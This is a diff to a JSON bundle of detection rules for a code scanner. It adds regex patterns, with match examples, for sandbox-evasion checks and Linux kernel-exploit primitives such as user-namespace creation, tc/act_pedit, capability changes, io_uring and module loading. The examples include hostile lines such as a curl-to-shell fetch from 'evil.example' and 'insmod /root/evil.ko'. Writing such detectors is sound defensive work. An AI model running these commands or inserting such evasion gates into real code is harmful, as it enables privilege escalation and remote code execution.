@@ -1,9 +1,9 @@
 {
-  "bundle_version": 5,
+  "bundle_version": 6,
   "generated": "2026-09-22",
   "packs": {
     "dead_anchors": {
-      "pack_version": 5,
+      "pack_version": 6,
       "rules": [
         {
           "category": "dead-anchor-extract",
@@ -279,7 +279,7 @@
       "schema_version": "1.0"
     },
     "mcp_security": {
-      "pack_version": 5,
+      "pack_version": 6,
       "rules": [
         {
           "category": "sql-injection",
@@ -1238,7 +1238,7 @@
       "schema_version": "1.0"
     },
     "runtime_dynamism": {
-      "pack_version": 5,
+      "pack_version": 6,
       "rules": [
         {
           "asset": "loaded code",
@@ -2508,12 +2508,235 @@
           "severity": "medium",
           "title": "Environment-aware activation: os.getenv('GITHUB_ACTIONS')",
           "type": "regex"
+        },
+        {
+          "category": "environment-detection",
+          "confidence": 0.55,
+          "examples": {
+            "match": [
+              "if (process.env.CURSOR_SANDBOX) exit(0)",
+              "process.env.CURSOR_SANDBOX && evade()",
+              "const s = process.env[\"CURSOR_SANDBOX\"]"
+            ],
+            "no_match": [
+              "process.env.PORT",
+              "process.env[\"NODE_ENV\"]",
+              "process.env.CODESPACES"
+            ]
+          },
+          "explanation": "Sandbox-presence probing: process.env sandbox marker.",
+          "id": "RD-CP-010",
+          "pattern": "process\\.env\\.(?:CURSOR_SANDBOX)\\b|process\\.env\\s*\\[\\s*[\\\"'](?:CURSOR_SANDBOX)[\\\"']\\s*\\]",
+          "severity": "medium",
+          "title": "Sandbox-presence probing: process.env CURSOR_SANDBOX marker",
+          "type": "regex"
+        },
+        {
+          "category": "environment-detection",
+          "confidence": 0.55,
+          "examples": {
+            "match": [
+              "os.environ.get('CURSOR_SANDBOX')",
+              "os.environ['CURSOR_SANDBOX']",
+              "environ.get(\"CURSOR_SANDBOX\")"
+            ],
+            "no_match": [
+              "os.environ.get('PORT')",
+              "os.environ['HOME']",
+              "os.environ.get('CODESPACES')"
+            ]
+          },
+          "explanation": "Sandbox-presence probing: os.environ sandbox marker.",
+          "id": "RD-CP-011",
+          "pattern": "\\benviron\\.get\\s*\\(\\s*[\\\"'](?:CURSOR_SANDBOX)[\\\"']|\\benviron\\s*\\[\\s*[\\\"'](?:CURSOR_SANDBOX)[\\\"']\\s*\\]",
+          "severity": "medium",
+          "title": "Sandbox-presence probing: os.environ CURSOR_SANDBOX marker",
+          "type": "regex"
+        },
+        {
+          "category": "environment-detection",
+          "confidence": 0.55,
+          "examples": {
+            "match": [
+              "os.getenv('CURSOR_SANDBOX')",
+              "getenv(\"CURSOR_SANDBOX\")",
+              "os.getenv( 'CURSOR_SANDBOX' )"
+            ],
+            "no_match": [
+              "os.getenv('PATH')",
+              "getenv(\"HOME\")",
+              "os.getenv('CODESPACES')"
+            ]
+          },
+          "explanation": "Sandbox-presence probing: os.getenv sandbox marker.",
+          "id": "RD-CP-012",
+          "pattern": "\\bgetenv\\s*\\(\\s*[\\\"'](?:CURSOR_SANDBOX)[\\\"']",
+          "severity": "medium",
+          "title": "Sandbox-presence probing: os.getenv CURSOR_SANDBOX marker",
+          "type": "regex"
+        },
+        {
+          "category": "environment-detection",
+          "confidence": 0.55,
+          "examples": {
+            "match": [
+              "if os.path.exists('/.dockerenv'): sys.exit(0)",
+              "test -f /.dockerenv && echo container",
+              "if (fs.existsSync('/run/.containerenv')) process.exit(0)",
+              "[ -f /.dockerenv ] && exit 0",
+              "os.path.exists('/.dockerenv') or payload()",
+              "os.path.exists('/run/.containerenv') and payload()"
+            ],
+            "no_match": [
+              "fs.statSync('/.dockerenv');",
+              "os.path.exists('/.dockerenv')",
+              "if (path === '/.dockerenv') {",
+              "ls /.docker"
+            ]
+          },
+          "explanation": "Sandbox-presence probing: container artifact check gating behavior. Requires the artifact probe to gate behavior on the same line; a bare existence check without trailing boolean composition (e.g. a container-detection helper) is not flagged.",
+          "id": "RD-CP-013",
+          "pattern": "(?:(?:\\bif\\b|&&|\\|\\||\\bexit\\b|\\breturn\\b|\\?|\\bunless\\b|\\bassert\\b|\\bwhile\\b)[^\\n]{0,200}(?:(?:os\\.path\\.(?:exists|isfile|isdir)|os\\.l?stat|fs\\.(?:existsSync|statSync|lstatSync|accessSync)|existsSync|statSync)\\s*\\(\\s*[\\\"'`]?(?:/\\.dockerenv|/run/\\.containerenv)\\b|(?:test|\\[\\[?)\\s+-[a-zA-Z]\\s+(?:/\\.dockerenv|/run/\\.containerenv)\\b|\\bstat\\s+(?:/\\.dockerenv|/run/\\.containerenv)\\b)|(?:(?:os\\.path\\.(?:exists|isfile|isdir)|os\\.l?stat|fs\\.(?:existsSync|statSync|lstatSync|accessSync)|existsSync|statSync)\\s*\\(\\s*[\\\"'`]?(?:/\\.dockerenv|/run/\\.containerenv)\\b|(?:test|\\[\\[?)\\s+-[a-zA-Z]\\s+(?:/\\.dockerenv|/run/\\.containerenv)\\b|\\bstat\\s+(?:/\\.dockerenv|/run/\\.containerenv)\\b)[^\\n]{0,200}(?:&&|\\|\\||\\bexit\\b|\\breturn\\b|\\?|\\bunless\\b|\\bor\\b|\\band\\b))",
+          "severity": "medium",
+          "title": "Sandbox-presence probing: container artifact check gating behavior",
+          "type": "regex"
+        },
+        {
+          "category": "environment-detection",
+          "confidence": 0.55,
+          "examples": {
+            "match": [
+              "systemd-detect-virt --quiet",
+              "subprocess.run(['systemd-detect-virt'])",
+              "VIRT=$(systemd-detect-virt)"
+            ],
+            "no_match": [
+              "systemd-analyze blame",
+              "systemd-detect-virtuous"
+            ]
+          },
+          "explanation": "Sandbox-presence probing: virtualization detection tool.",
+          "id": "RD-CP-014",
+          "pattern": "\\bsystemd-detect-virt\\b",
+          "severity": "medium",
+          "title": "Sandbox-presence probing: virtualization detection tool",
+          "type": "regex"
+        },
+        {
+          "category": "environment-detection",
+          "confidence": 0.55,
+          "examples": {
+            "match": [
+              "[ -n \"$CURSOR_SANDBOX\" ] && exit 0",
+              "echo ${CURSOR_SANDBOX}",
+              "[ -n \"${CURSOR_SANDBOX:-}\" ] && exit 0"
+            ],
+            "no_match": [
+              "echo $HOME",
+              "echo ${PATH}",
+              "[ -n \"$CODESPACES\" ] && true"
+            ]
+          },
+          "explanation": "Sandbox-presence probing: shell sandbox marker reference.",
+          "id": "RD-CP-015",
+          "pattern": "\\$(?:\\{(?:CURSOR_SANDBOX)(?::[-=?+][^}]*)?\\}|(?:CURSOR_SANDBOX)\\b)",
+          "severity": "medium",
+          "title": "Sandbox-presence probing: shell CURSOR_SANDBOX marker",
+          "type": "regex"
+        },
+        {
+          "category": "cloud-ide-detection",
+          "confidence": 0.4,
+          "examples": {
+            "match": [
+              "if (process.env.CODESPACES) forwardPort()",
+              "const id = process.env.REPL_ID",
+              "if (process.env[\"GITPOD_WORKSPACE_ID\"]) hint()"
+            ],
+            "no_match": [
+              "process.env.PORT",
+              "process.env[\"NODE_ENV\"]",
+              "process.env.CURSOR_SANDBOX"
+            ]
+          },
+          "explanation": "Cloud-IDE presence check (CODESPACES/GITPOD/REPL). Common in legitimate dev tooling; low-severity signal only.",
+          "id": "RD-CP-016",
+          "pattern": "process\\.env\\.(?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)\\b|process\\.env\\s*\\[\\s*[\\\"'](?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)[\\\"']\\s*\\]",
+          "severity": "low",
+          "title": "Cloud-IDE-presence check: process.env cloud-IDE marker",
+          "type": "regex"
+        },
+        {
+          "category": "cloud-ide-detection",
+          "confidence": 0.4,
+          "examples": {
+            "match": [
+              "os.environ.get('CODESPACES')",
+              "os.environ['REPL_ID']",
+              "environ.get(\"GITPOD_WORKSPACE_ID\")"
+            ],
+            "no_match": [
+              "os.environ.get('PORT')",
+              "os.environ['HOME']",
+              "os.environ.get('CURSOR_SANDBOX')"
+            ]
+          },
+          "explanation": "Cloud-IDE presence check (CODESPACES/GITPOD/REPL). Common in legitimate dev tooling; low-severity signal only.",
+          "id": "RD-CP-017",
+          "pattern": "\\benviron\\.get\\s*\\(\\s*[\\\"'](?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)[\\\"']|\\benviron\\s*\\[\\s*[\\\"'](?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)[\\\"']\\s*\\]",
+          "severity": "low",
+          "title": "Cloud-IDE-presence check: os.environ cloud-IDE marker",
+          "type": "regex"
+        },
+        {
+          "category": "cloud-ide-detection",
+          "confidence": 0.4,
+          "examples": {
+            "match": [
+              "os.getenv('CODESPACES')",
+              "getenv(\"REPL_ID\")",
+              "os.getenv( 'GITPOD_WORKSPACE_ID' )"
+            ],
+            "no_match": [
+              "os.getenv('PATH')",
+              "getenv(\"HOME\")",
+              "os.getenv('CURSOR_SANDBOX')"
+            ]
+          },
+          "explanation": "Cloud-IDE presence check (CODESPACES/GITPOD/REPL). Common in legitimate dev tooling; low-severity signal only.",
+          "id": "RD-CP-018",
+          "pattern": "\\bgetenv\\s*\\(\\s*[\\\"'](?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)[\\\"']",
+          "severity": "low",
+          "title": "Cloud-IDE-presence check: os.getenv cloud-IDE marker",
+          "type": "regex"
+        },
+        {
+          "category": "cloud-ide-detection",
+          "confidence": 0.4,
+          "examples": {
+            "match": [
+              "[ -n \"$CODESPACES\" ] && exit 0",
+              "echo ${REPL_ID}",
+              "[ -n \"${GITPOD_WORKSPACE_ID:-}\" ] && exit 0"
+            ],
+            "no_match": [
+              "echo $HOME",
+              "echo ${PATH}",
+              "[ -n \"$CURSOR_SANDBOX\" ] && true"
+            ]
+          },
+          "explanation": "Cloud-IDE presence check (CODESPACES/GITPOD/REPL). Common in legitimate dev tooling; low-severity signal only.",
+          "id": "RD-CP-019",
+          "pattern": "\\$(?:\\{(?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)(?::[-=?+][^}]*)?\\}|(?:CODESPACES|GITPOD_WORKSPACE_ID|REPL_ID)\\b)",
+          "severity": "low",
+          "title": "Cloud-IDE-presence check: shell cloud-IDE marker",
+          "type": "regex"
         }
       ],
       "schema_version": "1.0"
     },
     "sast": {
-      "pack_version": 5,
+      "pack_version": 6,
       "rules": [
         {
           "asset": "server runtime",
@@ -3101,6 +3324,203 @@
           "pattern": "base64\\.b64decode\\s*\\(",
           "severity": "medium",
           "title": "Base64 Decode (Obfuscation Signal)",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "os.unshare(CLONE_NEWUSER)",
+              "flags = CLONE_NEWUSER | CLONE_NEWNET",
+              "libc.unshare(CLONE_NEWUSER)"
+            ],
+            "no_match": [
+              "git clone origin main",
+              "CLONE_NEWUSER2",
+              "clone_newuser",
+              "# os.unshare(CLONE_NEWUSER) explained",
+              "msg = 'we never pass CLONE_NEWUSER'"
+            ]
+          },
+          "explanation": "Kernel Exploit: User Namespace Flag (CLONE_NEWUSER) (kernel-exploit) detected in a .py file.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-025",
+          "pattern": "^(?![ \\t]*#).*[(|&,=]\\s*CLONE_NEWUSER\\b",
+          "severity": "high",
+          "title": "Kernel Exploit: User Namespace Flag (CLONE_NEWUSER)",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "os.unshare(CLONE_NEWUSER)",
+              "libc.unshare(0x10000000)",
+              "libc.setns(fd, 0)",
+              "libc.syscall(308, fd, 0)",
+              "subprocess.run([\"unshare\", \"-U\"])",
+              "getattr(os, \"unshare\")(0x10000000)",
+              "getattr(os, \"un\" + \"share\")(0x10000000)",
+              "from os import unshare as _u",
+              "libc.unshare(268435456)"
+            ],
+            "no_match": [
+              "def setns(netns, flags=os.O_CREAT, libc=None, fork=True):",
+              "setns('/proc/1/ns/net')  # go back to default netns",
+              "self.state.set('setns')",
+              "('setns', 'invalid'),",
+              "unshares(x)",
+              "# libc.unshare(CLONE_NEWUSER)",
+              "from pyroute2.netns import setns",
+              "libc.unshare(1073741824)"
+            ]
+          },
+          "explanation": "Kernel Exploit: Namespace Syscall (unshare/setns/clone3) (kernel-exploit) detected in a .py file.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-026",
+          "pattern": "^(?![ \\t]*#).*(?:\\bunshare\\s*\\([^)]*(?:CLONE_NEWUSER|0x10000000|268435456)\\b|\\bsetns\\s*\\(\\s*[\\w.]+\\s*,\\s*(?:CLONE_\\w+|0x[0-9a-fA-F]+|\\d+)\\s*[\\),]|\\bclone3\\s*\\(|\\bsyscall\\s*\\(\\s*(?:272|308|435)\\s*[,)]|(?:run|Popen|call|system|popen|exec\\w*|spawn\\w*)\\s*\\([^)]*[\\\"'](?:unshare|setns|clone3)(?:[\\\"']|\\s)|getattr\\s*\\([^,]+,\\s*[\\\"'](?:unshare|setns|clone3)[\\\"']|getattr\\s*\\([^,]+,\\s*[\\\"']un[\\\"']\\s*\\+\\s*[\\\"']share[\\\"']|getattr\\s*\\([^,]+,\\s*[\\\"']set[\\\"']\\s*\\+\\s*[\\\"']ns[\\\"']|\\bfrom\\s+[\\w.]+\\s+import\\s+[^#\\n]*\\b(?:unshare|setns|clone3)\\s+as\\s+\\w+)",
+          "severity": "critical",
+          "title": "Kernel Exploit: Namespace Syscall (unshare/setns/clone3)",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "socket.socket(socket.AF_NETLINK, socket.SOCK_RAW)",
+              "socket(16, 0)",
+              "s = socket.socket( AF_NETLINK )"
+            ],
+            "no_match": [
+              "socket.socket(socket.AF_INET)",
+              "# AF_NETLINK mention",
+              "socket.socket(socket.AF_PACKET)"
+            ]
+          },
+          "explanation": "Kernel Exploit: AF_NETLINK Socket (kernel-exploit) detected in a .py file.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-027",
+          "pattern": "^(?![ \\t]*#).*(?:socket\\.)?socket\\s*\\(\\s*(?:16|0x10|(?:socket\\.)?(?:AF|PF)_NETLINK)\\s*[\\s,)]",
+          "severity": "critical",
+          "title": "Kernel Exploit: AF_NETLINK Socket",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "os.system('tc qdisc add dev eth0 root netem')",
+              "module = 'act_pedit'",
+              "subprocess.run([\"tc\", \"qdisc\", \"add\", \"dev\", \"lo\", \"root\", \"netem\"])",
+              "ipr.tc(\"add-action\", \"pedit\", index=idx)"
+            ],
+            "no_match": [
+              "import pyroute2",
+              "from pyroute2 import IPRoute",
+              "tc qdisc show",
+              "# tc qdisc add dev eth0 root netem example",
+              "context.ipr.tc('add', 'htb', index=index)"
+            ]
+          },
+          "explanation": "Kernel Exploit: net/sched Control (tc/pyroute2) (kernel-exploit) detected in a .py file.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-028",
+          "pattern": "^(?![ \\t]*#).*(?:\\btc\\s+(?:qdisc|class|filter|action)\\s+(?:add|change|replace)\\b|\\bact_pedit\\b|[\\\"']tc[\\\"']\\s*,\\s*[\\\"'](?:qdisc|class|filter|action)[\\\"']\\s*,\\s*[\\\"'](?:add|change|replace)[\\\"']|\\.tc\\s*\\([^)]*\\bpedit\\b)",
+          "severity": "critical",
+          "title": "Kernel Exploit: net/sched Control (tc/pyroute2)",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "capset(hdrp, datap)",
+              "cap.cap_set_proc()",
+              "getattr(libc, \"capset\")(hdrp, datap)",
+              "from ctypes import capset as _cs"
+            ],
+            "no_match": [
+              "capacity(x)",
+              "prctl(PR_SET_NAME, name)",
+              "PR_CAP",
+              "libc.prctl(PR_CAPBSET_DROP, 19, 0, 0, 0)"
+            ]
+          },
+          "explanation": "Kernel Exploit: Capability Manipulation (kernel-exploit) detected in a .py file.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-029",
+          "pattern": "^(?![ \\t]*#).*(?:\\b(?:capset|capget|cap_set_proc|cap_set_flag)\\s*\\(|\\bPR_CAP(?!BSET_DROP\\b)\\w+\\b|getattr\\s*\\([^,]+,\\s*[\\\"'](?:capset|capget)[\\\"']|\\bfrom\\s+[\\w.]+\\s+import\\s+[^#\\n]*\\b(?:capset|capget)\\s+as\\s+\\w+)",
+          "severity": "high",
+          "title": "Kernel Exploit: Capability Manipulation",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "libc.io_uring_setup(128, ctypes.byref(params))",
+              "io_uring_queue_init(entries, ring, 0)",
+              "CDLL(\"liburing.so.2\")",
+              "getattr(libc, \"io_uring_setup\")(128, p)",
+              "libc.syscall(425, 32, ctypes.byref(params))"
+            ],
+            "no_match": [
+              "# io_uring is fast",
+              "uring(x)",
+              "during_setup()",
+              "DEPS = ['liburing']"
+            ]
+          },
+          "explanation": "Kernel Exploit: io_uring Usage (kernel-exploit) detected in a .py file.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-030",
+          "pattern": "^(?![ \\t]*#).*(?:\\bio_uring_\\w+\\s*\\(|(?:CDLL|cdll\\.\\w+|dlopen|LoadLibrary\\w*)\\s*\\(\\s*[\\\"'][^\\\"']*liburing|getattr\\s*\\([^,]+,\\s*[\\\"']io_uring_\\w+[\\\"']|\\bsyscall\\s*\\(\\s*425\\s*[,)])",
+          "severity": "high",
+          "title": "Kernel Exploit: io_uring Usage",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.6,
+          "examples": {
+            "match": [
+              "subprocess.run([\"modprobe\", \"act_pedit\"])",
+              "os.system('/sbin/modprobe act_pedit')",
+              "os.system(\"insmod /root/evil.ko\")",
+              "cmd = \"mod\" + \"probe\" + \" act_pedit\""
+            ],
+            "no_match": [
+              "modprobe module",
+              "# load with modprobe",
+              "rmmod act_pedit"
+            ]
+          },
+          "explanation": "Kernel Module Load (modprobe/insmod) (kernel-exploit) detected in a .py file. Dual-use primitive: common in legitimate system tooling and test harnesses; review in context.",
+          "extensions": [
+            ".py"
+          ],
+          "id": "SA-PY-031",
+          "pattern": "^(?![ \\t]*#).*(?:[\\\"'](?:/usr/sbin/|/sbin/)?(?:modprobe|insmod)[\\s\\\"']|[\\\"']mod[\\\"']\\s*\\+\\s*[\\\"']probe|[\\\"']in[\\\"']\\s*\\+\\s*[\\\"']smod)",
+          "severity": "medium",
+          "title": "Kernel Module Load (modprobe/insmod)",
           "type": "regex"
         },
         {
@@ -5487,12 +5907,154 @@
           "severity": "critical",
           "title": "OIDC Token Exchange",
           "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "unshare --user --map-root-user bash",
+              "unshare -Urm bash",
+              "nsenter -t 1 -m -u bash",
+              "nsenter --target=1 --mount bash",
+              "nsenter -t 01 -m bash",
+              "nsenter --target=001 -u sh"
+            ],
+            "no_match": [
+              "unshare",
+              "unshare --mount --propagation private bash",
+              "nsenter -t \"$pid\" -m bash",
+              "# unshare -Urn sh",
+              "share -x file"
+            ]
+          },
+          "explanation": "Kernel Exploit: User Namespace Creation (kernel-exploit) detected in a .sh file.",
+          "extensions": [
+            ".sh"
+          ],
+          "id": "SA-SH-020",
+          "pattern": "^(?![ \\t]*#).*(?:\\bunshare\\s+(?:-\\S+\\s+)*?(?:(?<!-)-[A-Za-z]*[Ur][A-Za-z]*\\b|--user\\b|--map-root-user\\b)|\\bnsenter\\s+(?:-\\S+\\s+)*?(?:-t\\s+0*1\\b|--target(?:=|\\s+)0*1\\b))",
+          "severity": "high",
+          "title": "Kernel Exploit: User Namespace Creation",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "tc qdisc add dev eth0 root handle 1: htb",
+              "tc action add action pedit munge ip ttl set 63",
+              "modprobe act_pedit",
+              "tc -batch /tmp/evil.tc",
+              "$TC qdisc add dev lo root netem"
+            ],
+            "no_match": [
+              "tc qdisc show",
+              "tc -s qdisc",
+              "etc config",
+              "# tc qdisc add dev lo root netem"
+            ]
+          },
+          "explanation": "Kernel Exploit: net/sched tc Configuration (kernel-exploit) detected in a .sh file.",
+          "extensions": [
+            ".sh"
+          ],
+          "id": "SA-SH-021",
+          "pattern": "^(?![ \\t]*#).*(?:\\btc\\s+(?:qdisc|class|filter|action)\\s+(?:add|change|replace)\\b|\\bact_pedit\\b|\\btc\\s+-b(?:atch)?\\s+\\S|\\$\\{?\\w+\\}?\\s+(?:qdisc|class|filter|action)\\s+(?:add|change|replace)\\b)",
+          "severity": "high",
+          "title": "Kernel Exploit: net/sched tc Configuration",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.65,
+          "examples": {
+            "match": [
+              "modprobe act_pedit",
+              "insmod /root/evil.ko",
+              "sudo modprobe br_netfilter",
+              "mod\"\"probe act_pedit"
+            ],
+            "no_match": [
+              "rmmod act_pedit",
+              "# modprobe act_pedit",
+              "modprobe",
+              "modprobe -n dummy",
+              "modprobe $iptables_module",
+              "function modprobe {",
+              "echo \"modprobe act_pedit\""
+            ]
+          },
+          "explanation": "Kernel Module Load (modprobe/insmod) (kernel-exploit) detected in a .sh file. Dual-use primitive: common in legitimate system tooling; review in context.",
+          "extensions": [
+            ".sh"
+          ],
+          "id": "SA-SH-022",
+          "pattern": "(?:^|[;&|`]|&&|\\|\\||\\$\\(|<\\(|>\\(|\\bthen\\b|\\bdo\\b)[ \\t]*(?:sudo[ \\t]+)*(?:modprobe|insmod)[ \\t]+(?!-(?:n|l|L|S)\\b|--(?:show|list|dry-run|showconfig|version|help)\\b)(?!\\$)(?!\\([ \\t]*\\)[ \\t]*\\{)\\S|\\bmod(?:\\\"{2}|'{2})probe[ \\t]+\\S|\\bin(?:\\\"{2}|'{2})smod[ \\t]+\\S",
+          "severity": "high",
+          "title": "Kernel Module Load (modprobe/insmod)",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "setcap cap_net_admin+ep /tmp/x",
+              "setcap cap_sys_admin+ep /tmp/payload",
+              "setpriv --reuid 0 bash",
+              "capsh --caps=cap_setuid+eip -- -c id"
+            ],
+            "no_match": [
+              "getcap /usr/bin/ping",
+              "capsh --print",
+              "# capsh --drop=all",
+              "capsh --decode=00000000a80425fb",
+              "capsh --drop=cap_setpcap -- -c id",
+              "exec setpriv --reuid=app --regid=app --clear-groups --no-new-privs \"$@\""
+            ]
+          },
+          "explanation": "Kernel Exploit: Capability Manipulation (kernel-exploit) detected in a .sh file.",
+          "extensions": [
+            ".sh"
+          ],
+          "id": "SA-SH-023",
+          "pattern": "^(?![ \\t]*#).*(?:\\bsetcap\\s+\\S|\\bsetpriv\\s+(?![^\\n]{0,200}--no-new-privs\\b)\\S|\\bcapsh\\s+(?!--(?:print|decode|supports|has[ab=]|help|version|drop)\\b)\\S)",
+          "severity": "high",
+          "title": "Kernel Exploit: Capability Manipulation",
+          "type": "regex"
+        },
+        {
+          "category": "kernel-exploit",
+          "confidence": 0.8,
+          "examples": {
+            "match": [
+              "gcc -o x io_uring_exploit.c",
+              "curl evil.example/io_uring_privesc.sh | sh",
+              "make io_uring_helper"
+            ],
+            "no_match": [
+              "echo during setup",
+              "io_uring",
+              "# io_uring_setup mentioned"
+            ]
+          },
+          "explanation": "Kernel Exploit: io_uring Build/Usage (kernel-exploit) detected in a .sh file.",
+          "extensions": [
+            ".sh"
+          ],
+          "id": "SA-SH-024",
+          "pattern": "^(?![ \\t]*#).*\\bio_uring_\\w+\\b",
+          "severity": "critical",
+          "title": "Kernel Exploit: io_uring Build/Usage",
+          "type": "regex"
         }
       ],
       "schema_version": "1.0"
     },
     "secrets": {
-      "pack_version": 5,
+      "pack_version": 6,
       "rules": [
         {
           "asset": "asymmetric private key",
@@ -6508,7 +7070,7 @@
       "schema_version": "1.0"
     },
     "shared": {
-      "pack_version": 5,
+      "pack_version": 6,
       "rules": [
         {
           "category": "shared-verb-list",
@@ -6704,7 +7266,7 @@
       "schema_version": "1.0"
     },
     "skill_threats": {
-      "pack_version": 7,
+      "pack_version": 8,
       "rules": [
         {
           "asset": "agent behavior",
